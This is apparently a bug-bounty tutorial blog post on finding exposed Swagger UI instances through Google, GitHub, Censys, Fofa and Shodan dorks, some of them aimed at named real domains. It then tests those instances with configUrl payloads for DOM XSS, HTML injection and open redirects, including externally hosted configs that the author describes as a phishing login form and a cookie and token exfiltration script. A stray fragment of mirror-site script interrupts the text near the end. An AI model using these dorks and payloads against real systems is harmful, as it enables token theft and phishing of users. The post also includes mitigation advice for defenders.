---
title: 'The Dark Side of Swagger UI: How XSS and HTML Injection Can Compromise APIs'
subtitle: A hunter’s guide to finding XSS and HTML injection in Swagger UIs
tags:
- Bug Bounty
- Technology
- Penetration Testing
- Cybersecurity
- Swagger
published: '2025-06-24'
updated: '2026-04-23'
free: false
freedium_url: https://freedium-mirror.cfd/https://infosecwriteups.com/the-dark-side-of-swagger-ui-how-xss-and-html-injection-can-compromise-apis-1b670972a443
source_url: https://infosecwriteups.com/the-dark-side-of-swagger-ui-how-xss-and-html-injection-can-compromise-apis-1b670972a443
---

# The Dark Side of Swagger UI: How XSS and HTML Injection Can Compromise APIs

*A hunter’s guide to finding XSS and HTML injection in Swagger UIs*

*Published Jun 24, 2025 · Updated Apr 23, 2026 · Free: No*

### Introduction

**Swagger UI** is an open-source tool that helps developers visualize and interact with API endpoints defined by the OpenAPI Specification. While it's great for testing and documentation, exposed or misconfigured Swagger instances can lead to serious security issues like **DOM XSS**, **HTML injection** and **open redirects**. With bug bounty platforms rewarding such vulnerabilities, securing Swagger UI isn't just critical. it's also a valuable target for ethical hackers.

### Why Swagger UI Can Be Dangerous

The problem isn't Swagger itself. It's the way developers deploy it sometimes publicly, sometimes with sensitive endpoints and often without authentication and input sanitization

#### Common issues include:

- Swagger UI exposed on the internet with production endpoints.
- Lack of access control on documentation.
- Improper input sanitization, allowing for XSS and HTML injection.

### Recon Phase: Finding Swagger UIs

Before exploiting any vulnerabilities, the first step is discovering exposed Swagger instances. Using smart recon methods we can uncover targets hiding in plain sight. Here's how to uncover exposed Swagger interfaces using different recon techniques.

### Finding Exposed APIs Using Google Dorks

Let's start with Google dorking, a technique that uses advanced search queries to uncover publicly accessible Swagger UI instances indexed by search engines

```php
# 1. Find non-root subdomains of swagger.io with exposed Swagger UI
site:*.swagger.io -www — Discover test/dev subdomains under swagger.io exposing Swagger UI.

# 2. Find Swagger UI on a specific target domain
intext:"Swagger UI" intitle:"Swagger UI" site:Target.com — Locate pages on a specific domain where Swagger UI is active.

# 3. Search for Swagger endpoints on NASA's domain
site:nasa.gov inurl:(swagger-ui OR swagger.json OR swagger.yaml) — Identify Swagger interfaces or specs exposed on nasa.gov.

# 4. Locate default Swagger UI paths
inurl:"/swagger-ui/index.html" — Target the default Swagger UI landing page used by many APIs.

# 5. Advanced: Find Swagger UI across multiple paths and file types on NASA
intitle:"Swagger UI" (inurl:"/swagger-ui/" OR inurl:"/swagger/" OR inurl:"/api-docs/" OR inurl:"/v2/api-docs" OR inurl:"/v3/api-docs" OR inurl:"swagger.json" OR inurl:"swagger.yaml") -github -gitlab -stackoverflow site:nasa.gov — Combine multiple common Swagger UI paths while filtering dev platform noise.

# 6. Find exposed API spec files in common API folders on NASA
site:nasa.gov (inurl:api OR inurl:apis OR inurl:graphql OR inurl:swagger OR inurl:v1 OR inurl:v2 OR inurl:v3) (filetype:json OR filetype:yaml OR filetype:xml) — Discover JSON/YAML/XML API schema files across known API directories.
```

These dorks expose thousands of Swagger UI endpoints across dev, staging and live environments. some granting unauthenticated access to sensitive API docs, perfect for recon and bug bounty hunting.

> **To bulk open Swagger UIs, you can use the Link Gopher browser extension and manually test each Swagger interface for vulnerabilities**

[**Link Gopher**](https://sites.google.com/site/linkgopher/)
*Link Gopher is a simple extension to extract links from Firefox or Google Chrome. It extracts all links from web page…*

#### Automating Google Dork Results

If you want to mass dump these dork results, you can use my custom dorking script. It basically fetches all Google dork results within seconds and gives you a full list of Swagger UI URLs with filtering only the domain parts using a sorting method. Then, finally use the Nuclei template to scan all vulnerable domains

```bash
python dorking.py
cat swagger.txt | awk -F/ '{print $3}' | sort -u
cat swagger.txt | awk -F/ '{print $3}' | sort -u | nuclei -t Swagger.yaml
```

### Hunting Swagger Endpoints via GitHub Dorks

Now let's move on to GitHub dorking. You can use this simple dork to find vulnerable Swagger UI versions inside package.json files. Open the repo and check for Swagger-related URLs. or Use a filter to extract only the URLs so you can manually inspect all Swagger links found in those files.

```bash
# 1. Find outdated Swagger UI versions in GitHub repos
"/swagger-ui-dist\": \"3.[1-3]/" path:*/package.json — Locate GitHub projects using vulnerable Swagger UI versions 3.1 to 3.3 via package.json files.

# 2. Search GitHub repos for hardcoded URLs or endpoints
repo:ORG/REPO ("https://" OR "http://" OR ".com") — Identify hardcoded links or endpoints in a specific GitHub repo, which may expose Swagger instances or API hosts.
Example: repo:strapi/strapi ("https://" OR "http://" OR ".com")
```

This reveals apps using vulnerable versions. Look inside for:

- Host URLs
- API schemas
- Live Swagger URLs

### Using Censys to find Public Swagger UIs

Next, let's jump into Censys search. another great platform for finding Swagger domains. Use this combined dork. It searches HTTP response bodies for keywords like "swagger" or "swagger-ui", helping you uncover publicly exposed Swagger documentation. These often leak sensitive API endpoints that you can test for XSS, open redirect or IDOR vulnerabilities.

```perl
# 1. Censys: Find Swagger keywords in HTTP response bodies using host field
host.services.endpoints.http.body:{"swagger", "swagger-ui"} — Search for servers indexed by Censys that return Swagger-related content in HTTP response bodies.

# 2. Censys: Alternative search using web field path
web.endpoints.http.body:{"swagger", "swagger-ui"} — Identify Swagger UI presence using the alternative `web.endpoints.http.body` field in Censys data.

# 3. Censys: Search for Swagger mentions on NASA infrastructure
nasa AND host.services.endpoints.http.body:{"swagger", "swagger-ui"} OR web.endpoints.http.body:{"swagger", "swagger-ui"} — Locate Swagger UIs across NASA-tagged services by searching HTTP body content.

# 4. Censys: Find Swagger exposures on NASA-tagged IPs with response analysis
(nasa AND host.services.endpoints.http.body:{"swagger", "swagger-ui"} OR web.endpoints.http.body:{"swagger", "swagger-ui"}) AND host.ip:* — Deep search across Censys for Swagger mentions tied to NASA-related IP addresses.
```

### Finding Swagger UIs with Fofa Queries

Now, let's move on to one of my favorite platforms for finding Swagger UI is fofa search. Just enter the domain name and it'll show all results with their associated favicon icons. Select the Swagger favicon icon to filter out only Swagger URLs. You can also combine all favicon hashes to target specific domains or scan all publicly available Swagger UI instances.

```bash
"redacted.com" && (icon_hash="-1180440057" || icon_hash="-1128940573" || icon_hash="-1839822816" || icon_hash="1120729672")
```

This reveals instances based on their favicon. You can filter by org domain or use regex to get more precise results.

### Finding Exposed Swagger Interfaces Using Shodan

Now let's move on to our final reconnaissance method. Shodan is a powerful search engine for internet-connected devices and it's an excellent resource for discovering exposed Swagger UI instances. Here are some highly effective Shodan search queries to help you uncover exposed Swagger UI instances:

```python
# 1. Shodan: Detect services with Swagger identified in components
http.component:"Swagger" — Find services where Shodan has recognized Swagger as a web component (useful for direct Swagger UI identification).

# 2. Shodan: Search for pages titled "Swagger UI"
http.title:"Swagger UI" — Locate web servers that display “Swagger UI” in the HTML <title>, a common trait of Swagger interfaces.

# 3. Shodan: Find pages containing "swagger-ui" in the HTML body
http.html:"swagger-ui" — Match servers whose HTML response contains the string “swagger-ui”, pointing to exposed interfaces.

# 4. Shodan: Combined filter for highly accurate Swagger UI detection
http.component:"Swagger" http.title:"Swagger UI" http.html:"swagger-ui" — Combine component, title, and body filters for more precise Swagger UI discovery.

# 5. Shodan: Identify Swagger UIs using known favicon hash
http.favicon.hash:"-1128940573" — Match services using the default Swagger UI favicon (great for fingerprinting Swagger across the web).

# 6. Shodan: Search for pages with title “Swagger UI” returning 200 OK
http.title:"Swagger UI" +200 — Narrow Swagger UI results to only those returning HTTP 200 (live and accessible).

# 7. Shodan: Look for Swagger UI on a specific domain
http.title:"Swagger UI" hostname:"getsling.com" — Locate active Swagger UIs specifically on the domain `getsling.com`.
```

### Mass Hunting using Shodan facet analysis

Now, use Shodan's Facet Analysis feature and select the IP/Domain filter. This will generate a list of target IPs or domains where Swagger UI is exposed. To save these targets locally, simply run my custom script in your browser's developer console. It will automatically download all extracted IPs/Domains into a .txt file

```ruby
# 1. Extract IPs and export to a text file
var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='ip.txt';document.body.appendChild(a);a.click();

# 2. Extract Doamins name and export to a text file
var ipElements=document.querySelectorAll('strong'),ips=[],domains=[];ipElements.forEach(function(e){var t=e.innerHTML.replace(/['"]/g,'').trim();/^(\d{1,3}\.){3}\d{1,3}$/.test(t)?ips.push(t):/^(?!\d+\.)[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(t)&&domains.push(t)});var dataString='IPs:\n'+ips.join('\n')+'\n\nDomains:\n'+domains.join('\n'),a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(dataString);a.download='domains.txt';document.body.appendChild(a);a.click();
```

Now you have two files one containing all the IPs and another with domain names. Simply clean or sort the domain list. Once sorted you're all set to run the Nuclei template on these targets to begin scanning for the swaggwe vulnerability:

```bash
cat ip.txt | sort -u| nuclei -t Swagger.yaml
cat domains.txt | sort -u | nuclei -t Swagger.yaml
```

### Automation with Subfinder and Httpx

Now, let's move on to a simpler and more hands-on method using **Subfinder** and **Httpx**. Start by running Subfinder on your target domain to enumerate all subdomains. Then pipe the results into Httpx to identify live hosts. From there, filter the output for URLs that contain Swagger-related paths and titles

```bash
# 1. Find Swagger UI on all subdomains of a target
subfinder -d target.com -all | httpx-toolkit -silent -title | grep "Swagger UI" — Enumerate all subdomains, probe them for HTTP responses, and filter those with a "Swagger UI" page title.

# 2. Detect Swagger, OpenAPI, Redoc, or RapiDoc on a list of domains
cat swagger.txt | httpx-toolkit -silent -title | grep -Ei "swagger|openapi|redoc|rapidoc" — Scan each domain in `swagger.txt` for exposed API docs by checking page titles for popular documentation keywords.

# 3. Probe common Swagger documentation paths on a single domain
echo "example.com" | httpx -path /docs,/swagger,/api-docs,/swagger-ui,/swagger-ui.html — Check if specific Swagger/OpenAPI paths are reachable on a given domain.
```

### Path Brute-Forcing with Custom Wordlists

Now, let's dive into directory and path brute-forcing an effective technique for uncovering hidden Swagger files and endpoints. While tools like ffuf work well, I recommend using Dirsearch for better coverage and reliability. With the right wordlist Dirsearch can identify all common Swagger paths and extensions

```bash
ffuf -w /root/wordlist/api/swagger_xss.txt:FUZZ -w alive_ones.txt:URL -u URLFUZZ -mc 200 -o ffuf-result.txt

dirsearch -u https://api.getsling.com -w payloads/swagger.txt -e html,json,yaml,js -t 20 --random-agent --force-recursive --full-url
```

[**swagger/swagger-wordlist.txt at main · coffinxp/swagger**](https://github.com/coffinxp/swagger/blob/main/swagger-wordlist.txt)
*Contribute to coffinxp/swagger development by creating an account on GitHub.*

### DOM XSS via Swagger UI in Jamf Pro

You can even discover Swagger-based XSS vulnerabilities in Apple ecosystem tools like Jamf Pro, which uses Swagger to document its Classic API. Interestingly, Jamf Pro stores the authentication token in localStorage under the key authToken, making it a potential target for client-side attacks if XSS is present.

```bash
https://VULNERABLE_JAMF/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==

/index.html?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLXRlbXBsYXRlcy9tYWluL2hlbHBlcnMvcGF5bG9hZHMvc3dhZ2dlci1wYXlsb2FkIgp9'
```

To identify this vulnerability, use the default Nuclei template linked to the Jamf Pro CVE. it scans for Swagger issues and reveals the document origin and exposed authToken. You can also test it manually by visiting the Classic API docs (e.g., /api-docs or /swagger). If vulnerable, the token appears in localStorage allowing potential XSS or token leakage.

If a Swagger UI instance in Jamf Pro is vulnerable to XSS, you can use the following payload to extract the auth token:

```javascript
alert(localStorage.getItem('authToken'))
```

Using this XSS vector an attacker could extract and exfiltrate the authToken or other sensitive data stored in the browser's localStorage.

### Dom XSS & HTML Injection & Open Redirect

If you come across an exposed Swagger UI instance, use my custom **JSON template** to manually test for **DOM XSS**, **HTML injection** and **open redirect** vulnerabilities. Even if the XSS doesn't trigger, HTML injection or open redirect issues are still valid findings and often accepted by major bug bounty platforms.

```bash
# 1. Loads a custom Swagger login form template for login phishing
https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/login.json

# 2. Tests open redirect behavior via a redirecting login config
https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/rlogin.json

# 3. Triggers a basic XSS payload to check for DOM-based vulnerabilities
https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/xsstest.json

# 4. Executes a script to exfiltrate cookies or auth tokens from localStorage
https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/xsscookie.json
```




[**GitHub - coffinxp/swagger**](https://github.com/coffinxp/swagger)
*Contribute to coffinxp/swagger development by creating an account on GitHub.*

### Mitigation: How Developers Can Prevent this Vulnerabilities

Misconfigured Swagger UI can expose serious vulnerabilities. Here are the most effective steps developers should take to secure it and prevent abuse.

- **Disable Swagger UI in production environments**
Avoid exposing Swagger documentation on live or customer-facing systems by disabling it in production builds.
- **Require authentication for accessing Swagger UI**
Protect Swagger routes (/swagger, /api-docs, etc.) using Basic Auth, token-based auth, or IP whitelisting to restrict public access.
- **Validate and sanitize query parameters like ?url=**
Use a strict whitelist of allowed domains or remove support for remote schema loading entirely to prevent XSS and open redirects.
- **Use the latest stable version of Swagger UI**
Stay updated with the newest Swagger releases to patch known vulnerabilities and benefit from improved input sanitization.
- **Apply consistent input validation and escaping**
Sanitize any dynamic data rendered within Swagger UI templates, especially values passed through query strings or user-defined schemas.

**You can also watch this video where I showed the complete practicle of this method:**

console.log(&quot;[FREEDIUM] iframe workaround started&quot;);
}
if (!event.data || (typeof event.data != 'string')) {
return false;
}
var data;
try {
data = JSON.parse(event.data);
} catch (e) {
console.error(e);
return false;
}
var iframe = document.querySelector('iframe');
if (!iframe || !(data.type === 'MEASURE' || data.context === 'iframe.resize')) {
return false;
}
notifyResize(data.height || data.details.height);
</body></html>"></iframe>

### Conclusion

And that's it! You've just uncovered how attackers hunt down and exploit vulnerable Swagger UI instances and how you can ethically do the same to earn bug bounties. From DOM XSS and HTML injection to open redirects, exposed Swagger UIs present a goldmine of opportunities to practice, learn and get rewarded for your skills.

### Disclaimer

> _The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly_
